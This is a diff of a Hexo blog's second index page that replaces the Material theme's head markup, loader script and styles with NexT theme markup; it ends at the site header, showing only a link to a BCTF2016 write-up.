@@ -1,1065 +1,1422 @@
 <!DOCTYPE html>
-<html style="display: none;" >
-    <head>
-    <meta charset="utf-8">
-    <!--
-        © Material Theme
-        https://github.com/viosey/hexo-theme-material
-        Version: 1.4.0 -->
-    <script>window.materialVersion = "1.4.0"</script>
-
-    <!-- Title -->
-    
-    <title>
-        
-        Hyrathon的博客
-    </title>
-
-    <!-- dns prefetch -->
-    <meta http-equiv="x-dns-prefetch-control" content="on">
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-
-    <!-- Meta & Info -->
-    <meta http-equiv="X-UA-Compatible">
-    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
-    <meta name="theme-color" content="#0097A7">
-    <meta name="author" content="Joachim Hyrathon">
-    <meta name="description" itemprop="description" content="三流逆向工程师的N流PWNer之旅">
-    <meta name="keywords" content="">
-
-    <!-- Site Verification -->
-    
-    
-
-    <!-- Favicons -->
-    <link rel="icon shortcut" type="image/ico" href="/img/favicon.png">
-    <link rel="icon" sizes="192x192" href="/img/favicon.png">
-    <link rel="apple-touch-icon" href="/img/favicon.png">
-
-    <!--iOS -->
-    <meta name="apple-mobile-web-app-title" content="Title">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="MobileOptimized" content="480">
-
-    <!-- Add to homescreen for Chrome on Android -->
-    <meta name="mobile-web-app-capable" content="yes">
-
-    <!-- Add to homescreen for Safari on iOS -->
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
-    <meta name="apple-mobile-web-app-title" content="Hyrathon的博客">
-
-    <!-- The Open Graph protocol -->
-    <meta property="og:url" content="http://yoursite.com">
-    <meta property="og:type" content="blog">
-    <meta property="og:title" content="Hyrathon的博客">
-    <meta property="og:image" content="/img/favicon.png" />
-    <meta property="og:description" content="三流逆向工程师的N流PWNer之旅">
-    
-
-    
-
-    <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="Hyrathon的博客">
-    <meta name="twitter:description" content="三流逆向工程师的N流PWNer之旅">
-    <meta name="twitter:image" content="/img/favicon.png">
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:url" content="http://yoursite.com" />
-
-    <!-- Add canonical link for SEO -->
-    
-        <link rel="canonical" href="http://yoursite.com/page/2/index.html" />
-    
-
-    <!-- Structured-data for SEO -->
-    
-        
 
 
 
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
     
-
-    <!--[if lte IE 9]>
-        <link rel="stylesheet" href="/css/ie-blocker.css">
-
-        
-            <script src="/js/ie-blocker.en.js"></script>
-        
-    <![endif]-->
-
-    <!-- Import lsloader -->
-    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+materialVersion+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(data&&data.indexOf(versionString)===-1){lsloader.removeLS(key)}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload){cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload);return}code=code.split(versionString)[1];if(/\.js?.+$/.test(versionNumber)){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload)}};lsloader.requestResource=function(name,path,cssonload){var that=this;if(/\.js?.+$/.test(path)){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else if(/\.css?.+$/.test(path)){this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>
-
-    <!-- Import CSS & jQuery -->
     
-        <style id="css/material.min.css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("css/material.min.css","/css/material.min.css?fJTiM/K1J3dWIruo3pxtAw==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";})</script>
-        <style id="css/style.min.css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("css/style.min.css","/css/style.min.css?oCSEO3ST+aEypEwttTDI9g==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";})</script>
-        
-        
-            <style>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
     
-    .footer-sns-facebook {
-        background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgY2xhc3M9Imljb24iIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxwYXRoIGQ9Ik0xMzguNiA3OGMtMjIuNCA1LjItNTUuOCA0MC4yLTYwLjYgNjMuNC0xLjQgNi40LTIgMTI5LjgtMS42IDM2Ny42LjYgMjk4LjYgMSAzNTguOCAzLjQgMzYzIDExIDIwLjIgMjEuNiAzMi40IDM3LjIgNDMgMTUgMTAuMiAxNy40IDExLjIgMzMgMTMgMTEuMiAxLjQgMTM2IDIgMzY1IDEuNiAzMTQtLjYgMzQ4LjYtMSAzNTUtMy44IDE1LjgtNy4yIDMzLjgtMjIgNDMuMi0zNS40IDUuMi03LjQgMTAuOC0xNi42IDEyLjYtMjAuNCAyLjgtNi40IDMuMi00MC44IDMuOC0zNTQgLjQtMjIzLS4yLTM1My40LTEuNC0zNjUtMi0xNy0yLjYtMTguNi0xMy0zNC04LjYtMTIuNi0xNC4yLTE4LjQtMjUuMi0yNS44LTcuOC01LjQtMTcuNC0xMS0yMS42LTEyLjQtNi0yLjItNzIuOC0yLjYtMzY1LjQtMi42LTE5Ni44LjItMzYxIC44LTM2NC40IDEuOHptNjU3LjYgODcuOGw0LjggMy44djU1LjJjMCA1NC42IDAgNTUuMi00LjYgNTkuNi00LjQgNC40LTYgNC42LTUwLjIgNS42bC00NS42IDEtNy4yIDUuNmMtMTAuNCA4LTE2LjggMTcuMi0xOS4yIDI3LjQtMSA1LTEuOCAyNC44LTEuOCA0NCAuMiAzOCAxLjYgNDQuNiAxMC44IDQ4IDIuOCAxLjIgMjguNCAyIDU2LjggMiA0Ny44IDAgNTIgLjIgNTYuMiAzLjhsNC44IDMuOHY1NS4yYzAgNTQuNiAwIDU1LjItNC42IDU5LjYtNC40IDQuNi01LjQgNC42LTU3IDUuMi0yOC44LjItNTQuNC44LTU2LjggMS40LTIuNC42LTUuNiAzLTYuOCA1LjQtMS44IDMuMi0yLjQgNDEuNC0yLjYgMTQzLjJsLS4yIDEzOC44LTUuNiA0LjgtNS42IDQuOEg2MDljLTUyLjQgMC01Mi44IDAtNTguMi00LjZsLTUuNC00LjYtLjItMTQwLjYtLjItMTQwLjYtNC44LTMuOGMtNC4yLTMuNC04LTMuOC0zNS42LTMuOC0zMi44IDAtNDEtMS44LTQzLjYtMTAtLjYtMi4yLTEuMi0yNS40LTEuMi01MS40IDAtNjAuOC0uMi01NyAzLjQtNjEuNiAyLjgtMy42IDYtNCAzNy44LTUgMzMtMSAzNS4yLTEuMiAzOS40LTUuNiA0LjYtNC40IDQuNi01LjIgNS44LTcxIDEuMi03My40LjItNjcuMiAxNi42LTk5LjQgOC0xNS44IDEyLjgtMjIgMjgtMzcgMTUuMi0xNS4yIDIxLjQtMTkuNiAzOC4yLTI4IDExLTUuNCAyNC0xMSAyOS0xMi4yIDYuMi0xLjggMjguNi0yLjYgNzEuMi0yLjYgNTguNi0uMiA2Mi42IDAgNjcgMy42eiIvPjwvc3ZnPg==);
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="三流逆向工程师的N流PWNer之旅">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Hyrathon的博客">
+<meta property="og:url" content="http://yoursite.com/page/2/index.html">
+<meta property="og:site_name" content="Hyrathon的博客">
+<meta property="og:description" content="三流逆向工程师的N流PWNer之旅">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hyrathon的博客">
+<meta name="twitter:description" content="三流逆向工程师的N流PWNer之旅">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
     }
-    
-    
-    .footer-sns-twitter {
-        background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgY2xhc3M9Imljb24iIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxwYXRoIGQ9Ik0xMzguNiA3OGMtMjIuNCA1LjItNTUuOCA0MC4yLTYwLjYgNjMuNC0xLjQgNi40LTIgMTI5LjgtMS42IDM2Ny42LjYgMjk4LjYgMSAzNTguOCAzLjQgMzYzIDExIDIwLjIgMjEuNiAzMi40IDM3LjIgNDMgMTUgMTAuMiAxNy40IDExLjIgMzMgMTMgMTEuMiAxLjQgMTM2IDIgMzY1IDEuNiAzMTQtLjYgMzQ4LjYtMSAzNTUtMy44IDE1LjgtNy4yIDMzLjgtMjIgNDMuMi0zNS40IDUuMi03LjQgMTAuOC0xNi42IDEyLjYtMjAuNCAyLjgtNi40IDMuMi00MC44IDMuOC0zNTQgLjQtMjIzLS4yLTM1My40LTEuNC0zNjUtMi0xNy0yLjYtMTguNi0xMy0zNC04LjYtMTIuNi0xNC4yLTE4LjQtMjUuMi0yNS44LTcuOC01LjQtMTcuNC0xMS0yMS42LTEyLjQtNi0yLjItNzIuOC0yLjYtMzY1LjQtMi42LTE5Ni44LjItMzYxIC44LTM2NC40IDEuOHptNTMyLjggMjA1YzEwIDQgMjMgMTAuOCAyOC44IDE1LjIgMTIuNiA5LjIgMTYuNiAxMC42IDI5LjQgOS40IDYuNi0uNiAxMy0zLjIgMjAuNC04LjIgMTEuMi03LjYgMTkuNC05LjIgMjMuNi01IDMuNiAzLjYgMi44IDktMi44IDE4LjYtNy4yIDEyLjQtNiAxOC44IDQuMiAyNC4yIDQuNCAyLjIgOC4yIDUuNiA4LjYgNy40IDEgNC44LTEyLjYgMjQuMi0yMiAzMS44LTExLjggOS4yLTE3LjIgMjIuNi0xOS42IDQ3LjgtNC44IDUwLjQtNy44IDY2LjYtMTYuNCA4NS40LTMgNy03IDE3LjgtOC44IDI0LTEuOCA2LjQtNSAxNC42LTcuNCAxOC40LTIuMiAzLjgtNy40IDEzLTExLjQgMjAuNC0xNy4yIDMwLjgtNDMuNCA2MS40LTcxLjQgODMuOC0yNS42IDIwLjQtNDYgMzMuMi02NC4yIDQwLjItOC40IDMuMi0xOCA3LjYtMjEuNCA5LjYtNy40IDQuNi0yMi40IDguNi01Ny4yIDE1LTYyLjIgMTEuNi03OS4yIDExLjQtMTM1LjYtMS0zMi40LTctMzguNi05LTUyLTE2LjgtMjEuNC0xMi42LTI0LjItMTQuOC0yNC4yLTE5LjQgMC02LjIgMTAuMi05LjIgMzUtMTAuNCAyMi40LTEgMjguNi0yLjYgNTctMTQuMiAyMy44LTkuOCAyOS40LTEyLjggMzAuNC0xNi44IDIuMi04LjItMy0xMy4yLTI2LjgtMjUuNC0yNS44LTEzLjItMzIuMi0xOC40LTQzLjgtMzUuOC05LTEzLjYtMTAtMjEuMi0zLjYtMzMuNiA1LjQtMTAuOCAzLjYtMTUtMTEuOC0yNS40LTktNi0xNC0xMS42LTIwLjgtMjIuNi0yMy40LTM3LjgtMjUtNTAuOC03LjItNTkuOCA0LjgtMi40IDkuNC01LjQgMTAuMi02LjYgMi44LTQuMi0uNC0xNS42LTguNC0yOS0xMS42LTE5LjYtMTMuMi0yNS44LTEzLjItNTUuMiAwLTI4LjggMi42LTM3LjggMTItNDAuMiA5LTIuMiAxNC44IDEgMzUuNiAyMC4yIDI0LjggMjIuOCA0My42IDM2LjYgNjIuOCA0NS44IDggMy44IDE3LjggOS4yIDIyIDEyIDQuMiAyLjggMTQuOCA3IDIzLjQgOS4yIDguNiAyLjIgMjQuMiA2LjggMzQuOCAxMC4yIDEzLjQgNC40IDIzLjYgNi40IDMzIDYuNiAxMi44LjIgMTQuMi0uMiAxOC42LTUuNCA0LTQuOCA0LjgtNy44IDQuOC0xOS4yIDAtMTQuNCA1LjYtMzkuNiAxMS4yLTUwLjYgNC4yLTguNCAyOS4yLTM0LjIgMzkuOC00MS40IDcuOC01LjQgMzUuNi0xNiA1Mi0yMCAxNC4yLTMuNiAzMi42LTEuMiA1Mi40IDYuOHoiLz48L3N2Zz4=);
-    }
-    
-    
-    .footer-sns-gplus {
-        background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgY2xhc3M9Imljb24iIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxwYXRoIGQ9Ik0xMzguNiA3OGMtMjIuNCA1LjItNTUuOCA0MC4yLTYwLjYgNjMuNC0xLjQgNi40LTIgMTI5LjgtMS42IDM2Ny42LjYgMjk4LjYgMSAzNTguOCAzLjQgMzYzIDExIDIwLjIgMjEuNiAzMi40IDM3LjIgNDMgMTUgMTAuMiAxNy40IDExLjIgMzMgMTMgMTEuMiAxLjQgMTM2IDIgMzY1IDEuNiAzMTQtLjYgMzQ4LjYtMSAzNTUtMy44IDE1LjgtNy4yIDMzLjgtMjIgNDMuMi0zNS40IDUuMi03LjQgMTAuOC0xNi42IDEyLjYtMjAuNCAyLjgtNi40IDMuMi00MC44IDMuOC0zNTQgLjQtMjIzLS4yLTM1My40LTEuNC0zNjUtMi0xNy0yLjYtMTguNi0xMy0zNC04LjYtMTIuNi0xNC4yLTE4LjQtMjUuMi0yNS44LTcuOC01LjQtMTcuNC0xMS0yMS42LTEyLjQtNi0yLjItNzIuOC0yLjYtMzY1LjQtMi42LTE5Ni44LjItMzYxIC44LTM2NC40IDEuOHpNNDMwIDI5NS40YzQwLjYgMTUuNCA1Ni42IDIzLjggNzIuNiAzOC40IDYuOCA2LjIgNy4yIDE1LjIgMSAyMy40LTYuMiA4LTMzLjYgMzMuOC0zOSAzNi42LTUuNiAyLjgtMTcuNiAyLjgtMjMuMi0uMi0yLjQtMS4yLTguMi01LjItMTMtOC44LTExLjItOC42LTI0LjYtMTEuMi01NS4yLTExLjItMjcuNCAwLTQwLjYgMi42LTUyLjIgMTAuNC00LjQgMi44LTEyLjIgNy42LTE3LjIgMTAuNi0yMyAxMy4yLTUxLjQgNTUtNTUuOCA4Mi40LTIuNiAxNS42LTIuNCAzNC44LjIgNTEgMi44IDE3LjQgMTkuOCA0OC44IDM1LjIgNjUuMiAxNiAxNi42IDQ1IDMzLjYgNjIuOCAzNi42IDI2LjggNC40IDY1LjggMS42IDc5LjQtNS44IDIwLjYtMTEuNCAzMS0xOSA0MS0zMC40IDE4LjgtMjEuNiAyMy40LTM0LjIgMTUuNi00My44LTMuOC00LjgtNC40LTQuOC01MS01LjgtNjAuOC0xLjItNTYuMiAyLjItNTYuMi00My4yIDAtMzIuNC4yLTMzLjIgNC44LTM3IDQuNC0zLjYgOS0zLjggOTItMy44IDc5IDAgODcuOC40IDk0LjIgMy42IDExLjIgNS42IDEzIDExLjQgMTIuOCA0My40IDAgMjUuNC0uOCAzMC44LTcuNiA1OC00IDE2LjYtOS44IDM0LTEyLjYgMzktMi44IDUtOC4yIDE0LjItMTEuNiAyMC42LTguNCAxNS40LTI3LjIgMzYuOC00MC44IDQ2LjYtNS44IDQuNC0xMy44IDEwLjItMTcuNiAxMy4yLTMuOCAzLTExIDctMTYuMiA4LjgtNS4yIDEuOC0xNi4yIDYuNC0yNC40IDEwLTIyLjQgOS42LTM0LjggMTEuNi03MyAxMS42LTM3LjYuMi00Ny0xLjQtNzEtMTItOC4yLTMuNi0xNy42LTcuMi0yMC44LTgtMTUuOC0zLjgtNjctNDUuMi03Ny44LTYyLjgtMi4yLTMuOC03LjYtMTEuNi0xMS44LTE3LjItNC4yLTUuNC05LTE0LTEwLjYtMTktMS44LTQuOC02LjItMTYtMTAtMjQuOC0zLjYtOC44LTcuOC0yMi4yLTkuMi0yOS42LTMuMi0xOC44LTEuNC03OS40IDIuOC05MS40IDEzLjgtNDAuNiAzNS42LTc4IDU4LjgtMTAwLjIgMTQtMTMuNiA0Ny4yLTM2LjQgNTgtMzkuOCA0LjItMS40IDEzLjQtNS4yIDIwLjYtOC40IDIyLTEwIDMyLjgtMTEuNiA3Ni0xMSAzMy44LjYgNDAuNCAxLjIgNTAgNC44em0zNDAuOCA4MC44YzggMy42IDkuNiAxMS4yIDkuMiAzOS4yLS42IDM0LjQtLjYgMzQgNSAzOS42IDQuOCA1IDUuNCA1IDM3LjYgNSA0My40IDAgNDQuNC44IDQzLjIgMzYuMi0uOCAxNy0xLjIgMTguNC02LjQgMjMtNS40IDQuNi02LjYgNC44LTM3LjYgNC44LTMxLjIgMC0zMiAuMi0zNi44IDUtNS42IDUuNC01LjYgNC40LTUgNDEuMi40IDI2LjQuMiAyNy40LTQuNiAzMy00LjggNS42LTYgNS44LTI0LjQgNi40LTIwLjguOC0yOS42LTEuNC0zMy40LTguNC0xLjQtMi42LTItMTUuNi0xLjgtMzUuNi40LTMxLjIuNC0zMS42LTQuNi0zNi42cy01LjYtNS0zNi01Yy0xOC44IDAtMzMtLjgtMzYtMi4yLTcuNi0zLjYtOS42LTExLjItOC44LTMzLjguOC0yOC4yLjQtMjggNDEtMjggNDUuNCAwIDQ1LjQgMCA0NC42LTQyLjYtLjYtMzMtLjYtMzMgNS0zOC40IDQuNC00LjYgNi4yLTUgMjQuOC01IDExIDAgMjIuMiAxIDI1IDIuMnoiLz48L3N2Zz4=);
-    }
-    
-    
-    
-    
-    
-    
-    
-    
-    
-</style>
-
-        
-        <!-- Config CSS -->
-
-<!-- Other Styles -->
-<style>
-  body, html {
-    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
-  }
-
-  a {
-    color: #00838F;
-  }
-
-  .mdl-card__media,
-  #search-label,
-  #search-form-label:after,
-  #scheme-Paradox .hot_tags-count,
-  #scheme-Paradox .sidebar_archives-count,
-  #scheme-Paradox .sidebar-colored .sidebar-header,
-  #scheme-Paradox .sidebar-colored .sidebar-badge{
-    background-color: #0097A7 !important;
-  }
-
-  /* Sidebar User Drop Down Menu Text Color */
-  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
-  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
-    color: #0097A7 !important;
-  }
-
-  #post_entry-right-info,
-  .sidebar-colored .sidebar-nav li:hover > a,
-  .sidebar-colored .sidebar-nav li:hover > a i,
-  .sidebar-colored .sidebar-nav li > a:hover,
-  .sidebar-colored .sidebar-nav li > a:hover i,
-  .sidebar-colored .sidebar-nav li > a:focus i,
-  .sidebar-colored .sidebar-nav > .open > a,
-  .sidebar-colored .sidebar-nav > .open > a:hover,
-  .sidebar-colored .sidebar-nav > .open > a:focus,
-  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
-    color: #0097A7 !important;
-  }
-
-  .toTop {
-    background: #757575 !important;
-  }
-
-  .material-layout .material-post>.material-nav,
-  .material-layout .material-index>.material-nav,
-  .material-nav a {
-    color: #757575;
-  }
-
-  #scheme-Paradox .MD-burger-layer {
-    background-color: #757575;
-  }
-
-  #scheme-Paradox #post-toc-trigger-btn {
-    color: #757575;
-  }
-
-  .post-toc a:hover {
-    color: #00838F;
-    text-decoration: underline;
-  }
-
-</style>
+  };
+</script>
 
 
-<!-- Theme Background Related-->
 
-    <style>
-      body{
-        background-color: #F5F5F5;
-      }
-
-      /* blog_info bottom background */
-      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{
-        background-color: #fff;
-      }
-    </style>
+  <link rel="canonical" href="http://yoursite.com/page/2/"/>
 
 
 
 
-<!-- Fade Effect -->
 
-    <style>
-      .fade {
-        transition: all 800ms linear;
-        -webkit-transform: translate3d(0,0,0);
-        -moz-transform: translate3d(0,0,0);
-        -ms-transform: translate3d(0,0,0);
-        -o-transform: translate3d(0,0,0);
-        transform: translate3d(0,0,0);
-        opacity: 1;
-      }
-
-      .fade.out{
-        opacity: 0;
-      }
-    </style>
+  <title>Hyrathon的博客</title>
+  
 
 
-<!-- Import Font -->
-
-    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/icon?family=Material+Icons"rel="stylesheet">
 
 
-        <script>lsloader.load("js/jquery.min.js","/js/jquery.min.js?qcusAULNeBksqffqUM2+Ig==")</script>
-    
-    
-    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
 
-    <!-- Analytics -->
-    
 
-    <!-- Custom Head -->
-    
+
+
+
+
+
+
+
+
 </head>
 
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
 
+  
+  
     
-        <body id="scheme-Paradox" class="lazy">
-            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
-                
+  
 
-                <!-- Main Container -->
-                <main class="material-layout__content" id="main">
+  <div class="container sidebar-position-left 
+   page-home 
+ ">
+    <div class="headband"></div>
 
-                    <!-- Top Anchor -->
-                    <div id="top"></div>
-
-                    
-                        <!-- Hamburger Button -->
-                        <button class="MD-burger-icon sidebar-toggle">
-                            <span class="MD-burger-layer"></span>
-                        </button>
-                    
-
-                    <!-- Index Module -->
-<div class="material-index mdl-grid">
-    
-    <div class="locate-thumbnail-symbol"></div>
-
-    <!-- Pin on top -->
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
     
 
-    <!-- Normal Post -->
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/09/28/BCTF2016-pingpongmachine/">BCTF2016 pingpongmachine</a></p>
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hyrathon的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
     </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
 
